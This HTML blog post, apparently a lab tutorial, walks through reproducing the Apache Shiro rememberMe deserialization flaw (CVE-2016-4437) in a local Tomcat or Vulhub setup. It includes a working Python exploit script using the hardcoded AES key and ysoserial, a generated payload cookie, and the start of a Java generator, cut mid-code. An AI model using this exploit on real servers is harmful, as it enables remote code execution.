@@ -1,0 +1,504 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Shiro漏洞分析及利用 | 事在人为</title><meta name="author" content="YTZeri"><meta name="copyright" content="YTZeri"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="摘要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro漏洞分析及利用">
+<meta property="og:url" content="https://ytyyds.github.io/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="事在人为">
+<meta property="og:description" content="摘要">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ytyyds.github.io/img/Avatar1.jpg">
+<meta property="article:published_time" content="2024-03-19T11:14:01.941Z">
+<meta property="article:modified_time" content="2024-03-20T00:47:41.391Z">
+<meta property="article:author" content="YTZeri">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ytyyds.github.io/img/Avatar1.jpg"><link rel="shortcut icon" href="/img/www1.ico"><link rel="canonical" href="https://ytyyds.github.io/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: YTZeri","link":"链接: ","source":"来源: 事在人为","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Shiro漏洞分析及利用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-20 08:47:41'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/Avatar1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="事在人为"><span class="site-name">事在人为</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Shiro漏洞分析及利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-19T11:14:01.941Z" title="发表于 2024-03-19 19:14:01">2024-03-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-20T00:47:41.391Z" title="更新于 2024-03-20 08:47:41">2024-03-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%BA%93/">漏洞库</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Shiro漏洞分析及利用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>摘要</p>
+<span id="more"></span>
+
+<h1 id="Shiro漏洞分析及利用"><a href="#Shiro漏洞分析及利用" class="headerlink" title="Shiro漏洞分析及利用"></a>Shiro漏洞分析及利用</h1><h1 id="1-Shiro概述"><a href="#1-Shiro概述" class="headerlink" title="1.Shiro概述"></a>1.Shiro概述</h1><p>Shiro是一个用Java编写的强大且易于使用的身份验证、授权和加密框架。它提供了一套完整的安全解决方案，可以轻松地集成到Java应用程序中。Shiro的设计目标是简化应用程序的安全性实现，同时保持灵活性和可扩展性。</p>
+<p>Apache Shiro 是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为 550 的 issue 中爆出严重的 Java 反序列化漏洞。</p>
+<p>在 Apache Shiro&lt;&#x3D;1.2.4 版本中 AES 加密时采用的 key 是<strong>硬编码</strong>在代码中的，这就为伪造 cookie 提供了机会。</p>
+<p>只要 rememberMe 的 AES 加密密钥泄露，无论 shiro 是什么版本都会导致反序列化漏洞，重点是找到反序列化链子。</p>
+<p>Shiro 的 “记住我” 功能是设置 cookie 中的 rememberMe 值来实现。当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p>
+<ol>
+<li>检索 cookie 中 RememberMe 的值；</li>
+<li>Base64 解码；</li>
+<li>使用 AES 解密；</li>
+<li>反序列化。</li>
+</ol>
+<p>漏洞原因在于第三步，在 Apache Shiro&lt;&#x3D;1.2.4 版本中 AES 加密时采用的 key 是<strong>硬编码</strong>在代码中的，于是我们就可以构造 RememberMe 的值，然后让其反序列化执行。</p>
+<h1 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2.环境搭建"></a>2.环境搭建</h1><p><strong>Windows10 + IDEA</strong></p>
+<p><strong>shiro 1.2.4</strong></p>
+<p><strong>tomcat 8.5.73</strong></p>
+<p>下载 shiro 1.2.4</p>
+<p>github 地址: <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</a></p>
+<h3 id="使用-IDEA-进行环境搭建"><a href="#使用-IDEA-进行环境搭建" class="headerlink" title="使用 IDEA 进行环境搭建"></a>使用 IDEA 进行环境搭建</h3><p>在samples&#x2F;web&#x2F;pom.xml中添加依赖支持jsp，以及CC链</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  添加commons-collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="IDEA配置tomcat"><a href="#IDEA配置tomcat" class="headerlink" title="IDEA配置tomcat"></a>IDEA配置tomcat</h3><p>tomcat8下载地址：<a target="_blank" rel="noopener" href="https://tomcat.apache.org/download-80.cgi">https://tomcat.apache.org/download-80.cgi</a></p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318174738-6f5wk56.png" class="" title="image">
+
+<p>下载完成后直接解压即可。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318174831-xzy3uai.png" class="" title="image">
+
+<p>配置这里选择tomcat解压路径。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318174852-vba84g1.png" class="" title="image">
+
+<p>将samples-web添加进Tomcat的deployment中。</p>
+<p>为了方便直接用端口访问目标，可以将应用程序上下文置空。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318175030-l4rxow1.png" class="" title="image">
+
+<p>访问端口自定义即可。</p>
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318175221-czsd2fb.png" class="" title="image">
+
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318175258-j0lhha4.png" class="" title="image">
+
+<h1 id="3-使用Vulhub-Docker搭建"><a href="#3-使用Vulhub-Docker搭建" class="headerlink" title="3.使用Vulhub Docker搭建"></a>3.使用Vulhub Docker搭建</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">svn checkout https://github.com/vulhub/vulhub/trunk/shiro/CVE-2016-4437</span><br><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2016-4437</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4.漏洞复现"></a>4.漏洞复现</h1><p>payload生成流程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令=&gt;序列化=&gt;AES加密=&gt;<span class="built_in">base64</span>编码=&gt;RememberMe Cookie值</span><br></pre></td></tr></table></figure>
+
+<h2 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h2><p>ysoserial 项目地址: <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+<p>exp.py(需要将ysoserial的jar包放在同目录下)</p>
+<p>shiro 1.2.4 版本，使用的是默认 key: <code>kPH+bIxk5D2deZiIxcaaaA==</code>​</p>
+<p>AES 加密 cc 链，为 rememberMe 的 Cookie 值</p>
+<p>这里使用‘CommonsCollections2’生成链子(需要添加common-collections4依赖)生成命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-master-SNAPSHOT.jar&#x27;</span>, <span class="string">&#x27;CommonsCollections2&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])  </span><br><span class="line">    <span class="comment"># payload = encode_rememberme(&quot;touch /tmp/123456&quot;)</span></span><br><span class="line">    <span class="comment"># with open(&quot;payload.cookie&quot;, &quot;w&quot;) as fpw:</span></span><br><span class="line">        <span class="comment"># print(&quot;rememberMe=&#123;&#125;&quot;.format(payload.decode()), file=fpw)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py calc</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318194558-qpan7sq.png" class="" title="image">
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/03/19/Shiro%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/image-20240318194722-11ayzhh.png" class="" title="image">
+
+<h2 id="使用java生成payload"><a href="#使用java生成payload" class="headerlink" title="使用java生成payload"></a>使用java生成payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">generateBase64</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span 